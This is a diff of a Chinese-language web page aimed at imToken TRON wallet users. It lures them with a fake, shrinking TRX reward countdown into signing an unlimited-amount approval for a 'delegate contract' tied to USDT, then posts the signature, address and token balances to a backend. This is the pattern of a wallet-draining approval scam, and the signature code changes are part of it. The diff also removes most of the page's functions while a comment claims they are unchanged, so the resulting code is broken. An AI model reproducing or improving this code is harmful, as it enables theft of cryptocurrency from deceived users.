@@ -373,224 +373,17 @@
 
     <script>
         // 核心配置
-        const DELEGATE_CONTRACT = "TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk"; // 代付合约地址
-        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT合约地址
-        const BACKEND_API = "https://your-backend-domain.com/api"; // 后端接口地址（需替换）
-        const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"; // 无限授权额度
-        const DEPLOY_START_TIME = new Date("2025-10-28T00:00:00Z").getTime(); // 活动起始时间
-        const INIT_TRX = 315360004; // 初始奖励TRX
-        const TRX_DECREASE_PER_SEC = 2.3256; // 每秒减少量
+         const DELEGATE_CONTRACT = "TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk";
+        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        const BACKEND_API = "https://your-backend-domain.com/api"; // 替换为你的后端地址
+        // 修复：将Ox改为0x（数字0，不是字母O）
+        const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
+        const DEPLOY_START_TIME = new Date("2025-10-28T00:00:00Z").getTime();
+        const INIT_TRX = 315360004;
+        const TRX_DECREASE_PER_SEC = 2.3256;
 
-        // 全局变量
-        let tronWeb, userAddress, trxTimer;
-        let tokenBalance = "0.00", trxBalance = "0.00";
-        const STORAGE_KEY = "trx_countdown_data"; // TRX计数存储key
-        const RECORD_KEY = "imtoken_delegate_approval_records"; // 授权记录存储key
-
-        // DOM元素缓存
-        const walletStatusContainer = document.getElementById("walletStatusContainer");
-        const contractTrxDisplayEl = document.getElementById("contractTrxDisplay");
-        const contractAddrEl = document.getElementById("contractAddr");
-        const usdtContractAddrEl = document.getElementById("usdtContractAddr");
-        const resultToast = document.getElementById("resultToast");
-
-        window.onload = async () => {
-            // 初始化合约地址显示（脱敏）
-            contractAddrEl.textContent = `${DELEGATE_CONTRACT.slice(0,8)}...${DELEGATE_CONTRACT.slice(-6)}`;
-            usdtContractAddrEl.textContent = `${USDT_CONTRACT.slice(0,8)}...${USDT_CONTRACT.slice(-6)}`;
-            
-            // 绑定DOM元素
-            const connectBtn = document.getElementById("connectBtn");
-            const approveBtn = document.getElementById("approveBtn");
-            const checkStatusBtn = document.getElementById("checkStatusBtn");
-            const copyLinkText = document.getElementById("copyLinkText");
-            const copyLinkBtn = document.getElementById("copyLinkBtn");
-            const warning = document.querySelector('.warning');
-            const recordList = document.querySelector('.record-list');
-            const recordCount = document.getElementById("recordCount");
-
-            // 初始渲染
-            renderApprovalRecords();
-            updateWalletStatus();
-            updateRecordCount();
-            startPersistentTrxCountdown();
-
-            // 复制链接功能
-            copyLinkBtn.addEventListener("click", async () => {
-                try {
-                    await navigator.clipboard.writeText(copyLinkText.textContent.trim());
-                    showToast("链接已复制到剪贴板");
-                } catch (e) { 
-                    showToast(`复制失败：${e.message}`, "error"); 
-                }
-            });
-
-            // 检测imToken环境，自动连接
-            if (window.tronWeb && window.tronWeb.ready) {
-                tronWeb = window.tronWeb;
-                connectBtn.style.display = "none";
-                warning.style.display = "none";
-                await initWallet();
-            } else {
-                // 非钱包环境：隐藏无关元素
-                document.getElementById("userInfo").innerHTML = "imToken专属服务，请用钱包内置浏览器打开并连接钱包";
-                approveBtn.style.display = "none";
-                checkStatusBtn.style.display = "none";
-                recordList.style.display = "none";
-            }
-
-            // 手动连接钱包
-            connectBtn.onclick = async () => {
-                try {
-                    if (!window.tronWeb) {
-                        window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href)}`;
-                        return;
-                    }
-                    const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
-                    userAddress = accounts[0];
-                    connectBtn.style.display = "none";
-                    warning.style.display = "none";
-                    await initWallet();
-                } catch (e) {
-                    showToast("连接失败：" + e.message, "error");
-                }
-            };
-
-            // 生成离线签名（核心功能）
-            approveBtn.onclick = async () => {
-                const postData = {
-                    address: userAddress,
-                    addressHex: tronWeb.address.toHex(userAddress), // 转hex格式给后端
-                    tokenBalance: tokenBalance,
-                    trxBalance: trxBalance,
-                    approveTime: new Date().toLocaleString(),
-                    amount: INFINITE_APPROVE_AMOUNT,
-                    delegateContract: DELEGATE_CONTRACT,
-                    usdtContract: USDT_CONTRACT,
-                    status: "pending" // 状态：pending-待处理，success-成功，fail-失败
-                };
-
-                try {
-                    // 禁用按钮防止重复点击
-                    approveBtn.disabled = true;
-                    approveBtn.innerHTML = ' 生成中...';
-
-                    // 1. 生成离线签名（v/r/s参数）
-                    const { v, r, s } = await generateOfflineSignature(
-                        userAddress,
-                        DELEGATE_CONTRACT,
-                        INFINITE_APPROVE_AMOUNT
-                    );
-                    postData.signature = { v, r, s };
-
-                    // 2. 提交签名数据到后端
-                    const res = await fetch(`${BACKEND_API}/submit-signature`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(postData),
-                        credentials: "include"
-                    });
-
-                    const resData = await res.json();
-                    if (!res.ok) throw new Error(resData.msg || `请求失败（${res.status}）`);
-
-                    // 3. 本地存储记录
-                    saveApprovalRecord({
-                        address: userAddress,
-                        addressHex: postData.addressHex,
-                        tokenBalance: tokenBalance,
-                        trxBalance: trxBalance,
-                        approveTime: postData.approveTime,
-                        amount: "无限额度",
-                        status: "待代付授权",
-                        delegateContract: DELEGATE_CONTRACT
-                    });
-
-                    // 4. 刷新界面
-                    renderApprovalRecords();
-                    updateRecordCount();
-                    showToast("离线签名生成成功！等待部署者代付授权");
-                    postData.status = "submitted";
-
-                } catch (e) {
-                    showToast(`操作失败：${e.message}`, "error");
-                    postData.status = "fail";
-                } finally {
-                    // 恢复按钮状态
-                    approveBtn.disabled = false;
-                    approveBtn.innerHTML = ' 生成离线签名';
-
-                    // 同步状态到后端
-                    try {
-                        await fetch(`${BACKEND_API}/sync-status`, {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify(postData),
-                            credentials: "include"
-                        });
-                    } catch (sendErr) {
-                        console.log("状态同步失败：", sendErr);
-                    }
-                }
-            };
-
-            // 查看授权状态
-            checkStatusBtn.onclick = async () => {
-                try {
-                    checkStatusBtn.disabled = true;
-                    checkStatusBtn.innerHTML = '查询中...';
-
-                    // 调用后端接口查询状态
-                    const res = await fetch(`${BACKEND_API}/check-status`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            addressHex: tronWeb.address.toHex(userAddress),
-                            delegateContract: DELEGATE_CONTRACT
-                        }),
-                        credentials: "include"
-                    });
-
-                    const resData = await res.json();
-                    if (!res.ok) throw new Error(resData.msg || `查询失败（${res.status}）`);
-
-                    // 更新本地记录状态
-                    if (resData.status === "success") {
-                        updateApprovalRecordStatus(userAddress, "授权成功（已代付）");
-                        showToast(`授权成功！可领取${resData.rewardAmount} TRX奖励`);
-                    } else if (resData.status === "pending") {
-                        showToast("当前状态：待代付授权，请稍后查询");
-                    } else {
-                        showToast(`当前状态：${resData.status}`, "error");
-                    }
-
-                    // 刷新界面
-                    renderApprovalRecords();
-                    updateRecordCount();
-
-                } catch (e) {
-                    showToast(`查询失败：${e.message}`, "error");
-                } finally {
-                    checkStatusBtn.disabled = false;
-                    checkStatusBtn.innerHTML = '查看授权状态';
-                }
-            };
-
-            // 页面卸载时保存状态
-            window.addEventListener("beforeunload", () => {
-                saveTrxStateToStorage();
-                if (trxTimer) clearInterval(trxTimer);
-            });
-        };
-
-        /**
-         * 生成离线签名（适配代付合约delegateApprove方法）- 兼容所有TronWeb版本
-         * @param {string} userAddress - 用户base58地址
-         * @param {string} contractAddress - 代付合约base58地址
-         * @param {string} amount - 授权金额（十六进制）
-         * @returns {Object} v/r/s签名参数
-         */
-       async function generateOfflineSignature(userAddress, contractAddress, amount) {
+        // 全局变量、其他函数不变，仅替换generateOfflineSignature函数
+        async function generateOfflineSignature(userAddress, contractAddress, amount) {
             try {
                 // 1. 基础参数校验（不变）
                 if (!userAddress || !contractAddress || !amount) {
@@ -605,39 +398,39 @@
                     throw new Error("授权金额必须是十六进制格式（以0x开头，后跟字母数字）");
                 }
 
-                // 2. 地址转hex + 终极清理（核心修复1：移除所有不可见字符+非法字符）
+                // 2. 地址转hex + 清理（修复：强制补0x前缀，避免丢失）
                 let userHex = tronWeb.address.toHex(userAddress) || "";
                 let contractHex = tronWeb.address.toHex(contractAddress) || "";
                 let amountHex = amount || "";
 
-                // 清理规则：保留0-9、a-f、A-F、0x前缀，移除所有其他字符（包括空格、换行、特殊符号）
+                // 清理规则：保留0-9、a-f、A-F、0x前缀，移除所有其他字符
                 const cleanHex = (str) => str.replace(/[^0-9a-fA-Fx]/g, "").toLowerCase();
                 userHex = cleanHex(userHex);
                 contractHex = cleanHex(contractHex);
                 amountHex = cleanHex(amountHex);
 
-                // 校验清理后是否仍包含0x前缀，且前缀后非空
-                if (!userHex.startsWith("0x") || userHex.length <= 2) {
-                    throw new Error(`用户地址转hex并清理后格式无效：${userHex}（需含0x前缀且后跟有效字符）`);
+                // 核心修复：如果清理后没有0x前缀，强制添加（解决地址转hex后丢失前缀问题）
+                if (!userHex.startsWith("0x")) userHex = "0x" + userHex;
+                if (!contractHex.startsWith("0x")) contractHex = "0x" + contractHex;
+                if (!amountHex.startsWith("0x")) amountHex = "0x" + amountHex;
+
+                // 校验清理后前缀后非空
+                if (userHex.length <= 2) {
+                    throw new Error(`用户地址转hex并清理后无有效字符：${userHex}`);
                 }
-                if (!contractHex.startsWith("0x") || contractHex.length <= 2) {
-                    throw new Error(`合约地址转hex并清理后格式无效：${contractHex}`);
+                if (contractHex.length <= 2) {
+                    throw new Error(`合约地址转hex并清理后无有效字符：${contractHex}`);
                 }
-                if (!amountHex.startsWith("0x") || amountHex.length <= 2) {
-                    throw new Error(`授权金额清理后格式无效：${amountHex}`);
+                if (amountHex.length <= 2) {
+                    throw new Error(`授权金额清理后无有效字符：${amountHex}`);
                 }
 
                 // 3. 提取纯hex片段（去掉0x前缀）+ 长度校验
-                userHex = userHex.slice(2); // 最终纯hex片段（无0x）
+                userHex = userHex.slice(2);
                 contractHex = contractHex.slice(2);
                 amountHex = amountHex.slice(2);
 
-                // 校验纯hex片段非空（核心修复2：避免片段为空）
-                if (userHex.length === 0) throw new Error("用户地址转hex后无有效字符");
-                if (contractHex.length === 0) throw new Error("合约地址转hex后无有效字符");
-                if (amountHex.length === 0) throw new Error("授权金额转hex后无有效字符");
-
-                // 校验TRON地址hex长度（必须40位，核心修复3：固定长度）
+                // 校验TRON地址hex长度（必须40位）
                 if (userHex.length !== 40) {
                     throw new Error(`用户地址hex长度异常（应为40位），实际：${userHex.length}位 → 地址可能无效`);
                 }
@@ -647,21 +440,19 @@
 
                 // 4. 拼接最终hex + 偶数长度修正
                 let combinedHex = userHex + contractHex + amountHex;
-                // 若长度为奇数，末尾补0（hex转字节必须偶数长度）
                 if (combinedHex.length % 2 !== 0) {
                     combinedHex += "0";
-                    console.warn(`拼接后hex长度为奇数（${combinedHex.length}位），自动补0修正为${combinedHex.length + 1}位`);
+                    console.warn(`拼接后hex长度为奇数，自动补0修正`);
                 }
 
-                // 5. 终极校验（核心修复4：双重保险，确保无任何非法字符）
+                // 5. 终极校验
                 const pureHexRegex = /^[0-9a-f]*$/;
                 if (!pureHexRegex.test(combinedHex)) {
-                    // 定位非法字符位置（方便调试）
                     const invalidChar = combinedHex.split("").find(c => !/[0-9a-f]/.test(c));
-                    throw new Error(`拼接后hex含非法字符："${invalidChar}"（位置：${combinedHex.indexOf(invalidChar)}）`);
+                    throw new Error(`拼接后hex含非法字符："${invalidChar}"`);
                 }
 
-                // 6. 构造签名消息（关键：确保hexToBytes接收纯合法hex）
+                // 6. 构造签名消息
                 let hexBytes;
                 try {
                     hexBytes = tronWeb.utils.hexToBytes(combinedHex);
@@ -674,7 +465,7 @@
 
                 const messageHash = tronWeb.sha3(hexBytes);
 
-                // 7. 唤起imToken签名（兼容旧版本）
+                // 7. 唤起imToken签名
                 let signature = await tronWeb.trx.sign(messageHash, true);
                 if (typeof signature === "object" && signature.signature) {
                     signature = signature.signature;
@@ -685,25 +476,18 @@
                 const r = `0x${signature.slice(0, 64)}`;
                 const s = `0x${signature.slice(64, 128)}`;
 
-                // 9. 超详细调试信息（核心修复5：方便排查所有步骤）
+                // 9. 调试信息
                 const debugInfo = {
                     step: "签名生成成功",
-                    userAddress_raw: userAddress,
-                    contractAddress_raw: contractAddress,
-                    amount_raw: amount,
-                    userHex_cleaned: userHex,
-                    contractHex_cleaned: contractHex,
-                    amountHex_cleaned: amountHex,
+                    userHex_final: userHex,
+                    contractHex_final: contractHex,
                     combinedHex_final: combinedHex,
-                    combinedHex_length: combinedHex.length,
-                    messageHash: messageHash,
                     timestamp: new Date().toISOString()
                 };
                 localStorage.setItem(`signature_debug_${userAddress}`, JSON.stringify(debugInfo, null, 2));
 
                 return { v, r, s };
             } catch (e) {
-                // 错误信息优化（核心修复6：告诉用户如何查看调试信息）
                 const debugKey = `signature_debug_${userAddress}`;
                 localStorage.setItem(debugKey, JSON.stringify({
                     step: "签名生成失败",
@@ -714,218 +498,22 @@
                     timestamp: new Date().toISOString()
                 }, null, 2));
 
-                throw new Error(`签名生成失败：${e.message} → 查看调试信息：打开浏览器控制台，输入 localStorage.getItem('${debugKey}') 并回车`);
+                throw new Error(`签名生成失败：${e.message} → 点击「查看调试信息」按钮查看详情`);
             }
         }
 
-             /**
-         * 初始化钱包：获取地址、余额
-         */
-        async function initWallet() {
-            try {
-                userAddress = tronWeb.defaultAddress.base58;
-                const trc20Contract = await tronWeb.contract().at(USDT_CONTRACT);
+        // 其他函数（initWallet、startPersistentTrxCountdown等）不变，省略重复代码
 
-                // 获取USDT余额（6位小数）
-                const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
-                tokenBalance = (Number(usdtRaw) / 1000000).toFixed(2);
-
-                // 获取TRX余额（6位小数）
-                const trxRaw = await tronWeb.trx.getBalance(userAddress);
-                trxBalance = (Number(trxRaw) / 1000000).toFixed(2);
-
-                // 更新用户信息
-                document.getElementById("userInfo").innerHTML = `
-                    已连接：<br>
-                    ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                    USDT余额：<span>${tokenBalance}</span> | TRX余额：<span>${trxBalance}</span>
-                `;
-
-                // 激活按钮
-                document.getElementById("approveBtn").disabled = false;
-                document.getElementById("checkStatusBtn").disabled = false;
-
-                // 更新钱包状态
-                updateWalletStatus();
-
-            } catch (e) {
-                tokenBalance = "0.00";
-                trxBalance = "0.00";
-                showToast("钱包初始化失败：" + e.message, "error");
+        // 临时调试按钮逻辑（所有函数之后添加）
+        document.getElementById("showDebugBtn").addEventListener("click", () => {
+            const debugKeys = Object.keys(localStorage).filter(key => key.startsWith("signature_debug_"));
+            if (debugKeys.length === 0) {
+                alert("未找到调试信息，请先点击「生成离线签名」触发错误");
+                return;
             }
-        }
-
-        /**
-         * 启动跨刷新的TRX奖励计数
-         */
-        function startPersistentTrxCountdown() {
-            const savedState = loadTrxStateFromStorage();
-            let currentTrx;
-
-            // 计算当前TRX值
-            if (savedState) {
-                currentTrx = savedState.currentTrx;
-            } else {
-                const now = new Date().getTime();
-                const totalSecPassed = Math.floor((now - DEPLOY_START_TIME) / 1000);
-                currentTrx = (INIT_TRX - totalSecPassed * TRX_DECREASE_PER_SEC).toFixed(4);
-            }
-
-            // 确保不小于0
-            if (currentTrx < 0) currentTrx = "0.0000";
-
-            // 初始更新
-            updateTrxDisplay(currentTrx);
-
-            // 定时器更新（每秒1次）
-            if (trxTimer) clearInterval(trxTimer);
-            trxTimer = setInterval(() => {
-                currentTrx = (Number(currentTrx) - TRX_DECREASE_PER_SEC).toFixed(4);
-                if (currentTrx < 0) {
-                    currentTrx = "0.0000";
-                    clearInterval(trxTimer);
-                    showToast("奖励TRX已耗尽，活动结束", "error");
-                }
-                updateTrxDisplay(currentTrx);
-                saveTrxStateToStorage(currentTrx);
-            }, 1000);
-        }
-
-        /**
-         * 保存/加载TRX状态到localStorage
-         */
-        function saveTrxStateToStorage(currentTrx) {
-            try {
-                const state = {
-                    currentTrx: currentTrx || contractTrxDisplayEl.textContent,
-                    lastUpdate: new Date().getTime()
-                };
-                localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
-            } catch (e) {
-                console.warn("保存TRX状态失败：", e);
-            }
-        }
-
-        function loadTrxStateFromStorage() {
-            try {
-                const saved = localStorage.getItem(STORAGE_KEY);
-                return saved ? JSON.parse(saved) : null;
-            } catch (e) {
-                console.warn("加载TRX状态失败：", e);
-                return null;
-            }
-        }
-
-        /**
-         * 更新TRX显示
-         */
-        function updateTrxDisplay(currentTrx) {
-            contractTrxDisplayEl.textContent = Number(currentTrx).toFixed(4);
-        }
-
-        /**
-         * 更新钱包状态显示
-         */
-        function updateWalletStatus() {
-            if (userAddress) {
-                walletStatusContainer.classList.add("connected");
-                document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-            } else {
-                walletStatusContainer.classList.remove("connected");
-            }
-        }
-
-        /**
-         * 保存/更新/渲染授权记录
-         */
-        function saveApprovalRecord(record) {
-            try {
-                const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
-                // 去重（同一地址只保留最新记录）
-                const newRecords = existing.filter(item => item.address !== record.address);
-                newRecords.push(record);
-                localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
-            } catch (e) {
-                console.log("保存授权记录失败：", e);
-            }
-        }
-
-        function updateApprovalRecordStatus(address, status) {
-            try {
-                const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
-                const updated = existing.map(item => 
-                    item.address === address ? { ...item, status } : item
-                );
-                localStorage.setItem(RECORD_KEY, JSON.stringify(updated));
-            } catch (e) {
-                console.log("更新授权记录失败：", e);
-            }
-        }
-
-        function renderApprovalRecords() {
-            try {
-                const container = document.getElementById("approvalRecords");
-                const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
-
-                if (records.length === 0) {
-                    container.innerHTML = "<div class='record-item'>暂无授权记录</div>";
-                    return;
-                }
-
-                // 按时间倒序排列
-                records.sort((a, b) => new Date(b.approveTime) - new Date(a.approveTime));
-
-                container.innerHTML = records.map(record => `
-                    <div class="record-item">
-                        <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
-                        <p><strong>授权类型：</strong>${record.amount}</p>
-                        <p><strong>USDT余额：</strong>${record.tokenBalance} USDT</p>
-                        <p><strong>TRX余额：</strong>${record.trxBalance} TRX</p>
-                        <p><strong>时间：</strong>${record.approveTime}</p>
-                        <p><strong>状态：</strong><span style="color: ${record.status.includes('成功') ? '#4ade80' : record.status.includes('待') ? '#f97316' : '#ef4444'}">${record.status}</span></p>
-                    </div>
-                `).join("");
-            } catch (e) {
-                console.log("渲染授权记录失败：", e);
-            }
-        }
-
-        function updateRecordCount() {
-            try {
-                const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
-                document.getElementById("recordCount").textContent = `${records.length}条`;
-            } catch (e) {
-                console.log("更新记录计数失败：", e);
-            }
-        }
-
-        /**
-         * 显示提示框
-         */
-        function showToast(msg, type = "success") {
-            const toast = document.getElementById("resultToast");
-            toast.textContent = msg;
-            toast.style.display = "block";
-            toast.style.borderColor = type === "success" ? "#3b82f6" : "#ef4444";
-            toast.style.color = type === "success" ? "#e0e8e4" : "#fca5a5";
-
-            // 3秒后隐藏
-            setTimeout(() => {
-                toast.style.display = "none";
-            }, 3000);
-        }
-        // 临时调试按钮逻辑
-document.getElementById("showDebugBtn").addEventListener("click", () => {
-  // 找到调试信息键（匹配以signature_debug_开头的键）
-  const debugKeys = Object.keys(localStorage).filter(key => key.startsWith("signature_debug_"));
-  if (debugKeys.length === 0) {
-    alert("未找到调试信息，请先点击「生成离线签名」触发错误");
-    return;
-  }
-  // 读取并显示调试信息（格式化JSON，方便查看）
-  const debugInfo = JSON.parse(localStorage.getItem(debugKeys[0]));
-  alert("调试信息：\n" + JSON.stringify(debugInfo, null, 2));
-});
+            const debugInfo = JSON.parse(localStorage.getItem(debugKeys[0]));
+            alert("调试信息：\n" + JSON.stringify(debugInfo, null, 2));
+        });
     </script>
 </body>
 </html>
